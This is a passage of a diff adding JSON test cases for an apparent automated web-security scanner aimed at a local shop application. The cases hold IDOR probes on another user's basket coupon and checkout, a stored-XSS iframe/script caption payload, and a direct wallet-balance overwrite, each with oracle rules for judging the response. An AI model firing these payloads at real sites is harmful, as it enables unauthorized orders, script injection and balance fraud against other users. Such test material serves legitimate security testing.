+              200
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 4
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "tags": [
+        "idor",
+        "coupon",
+        "read"
+      ]
+    },
+    {
+      "id": "tc_idor_rest_basket_coupon_put",
+      "hypothesis_id": "idor_rest_basket_coupon_put",
+      "base_url": "http://localhost:3000",
+      "method": "PUT",
+      "endpoint": "http://localhost:3000/rest/basket/6/coupon/6665434535",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [],
+          "description": "Apply coupon to basket 6 and observe authorization",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated session"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "status_code in [401,403] indicates blocked modification",
+          "threshold": {
+            "expected_codes": [
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code in [200,204] and abs(body_length_delta_pct) >= 15 indicates unauthorized modification",
+          "threshold": {
+            "body_length_delta_pct": 15.0,
+            "expected_codes": [
+              200,
+              204
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 2
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.3,
+      "tags": [
+        "idor",
+        "coupon",
+        "put"
+      ]
+    },
+    {
+      "id": "tc_idor_rest_checkout_post",
+      "hypothesis_id": "idor_rest_checkout_post",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "http://localhost:3000/rest/basket/6/checkout",
+      "parameter": "body",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "couponData",
+              "value": "NjY2NTQzNDUzNS0xNzY0NjMwMDAwMDAw"
+            },
+            {
+              "location": "orderDetails",
+              "value": "{\"paymentId\":\"7\",\"addressId\":\"7\",\"deliveryMethodId\":\"1\"}"
+            }
+          ],
+          "description": "Attempt checkout for basket 6",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated session"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "status_code in [401,403] indicates blocked foreign checkout",
+          "threshold": {
+            "expected_codes": [
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code in [200,201] and abs(body_length_delta_pct) >= 20 indicates unauthorized order placement",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200,
+              201
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 2
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.3,
+      "tags": [
+        "idor",
+        "checkout",
+        "post"
+      ]
+    },
+    {
+      "id": "tc_xss_memories_post",
+      "hypothesis_id": "xss_memories_post",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "http://localhost:3000/rest/memories",
+      "parameter": "body",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "image",
+              "value": "memory"
+            },
+            {
+              "location": "caption",
+              "value": "<iframe srcdoc='<script>alert(4)</script>'>"
+            }
+          ],
+          "description": "Inject caption with executable content",
+          "content_type": "multipart/form-data; boundary=----WebKitFormBoundarymFG6Y4SHgGWtrT7N",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated session"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "gallery/view shows unescaped caption content",
+          "threshold": {
+            "expected_codes": [
+              200,
+              201
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code in [200,201] and abs(body_length_delta_pct) >= 15 suggests stored content",
+          "threshold": {
+            "body_length_delta_pct": 15.0,
+            "expected_codes": [
+              200,
+              201
+            ]
+          },
+          "weight": 0.5
+        },
+        {
+          "signal": "error_signature",
+          "condition": "status_code in [400,422] with template/sanitizer errors",
+          "threshold": {
+            "expected_codes": [
+              400,
+              422
+            ]
+          },
+          "weight": 0.3
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 2
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "tags": [
+        "xss",
+        "memories",
+        "stored"
+      ]
+    },
+    {
+      "id": "tc_biz_wallet_balance_put",
+      "hypothesis_id": "biz_wallet_balance_put",
+      "base_url": "http://localhost:3000",
+      "method": "PUT",
+      "endpoint": "http://localhost:3000/rest/wallet/balance",
+      "parameter": "body",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "balance",
+              "value": "555"
+            },
+            {
+              "location": "paymentId",
+              "value": "7"
+            }
+          ],
+          "description": "Attempt direct balance manipulation",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated session"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "status_code in [400,401,403] indicates rejection of direct balance set",
+          "threshold": {
+            "expected_codes": [
+              400,
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "status_code in [200,204] and abs(body_length_delta_pct) >= 15 indicates insecure balance manipulation",
+          "threshold": {
+            "body_length_delta_pct": 15.0,
+            "expected_codes": [
+              200,
+              204
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 2
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.3,
+      "tags": [
+        "business_logic",
+        "wallet",
+        "put"
+      ]
+    }
+  ]
+}
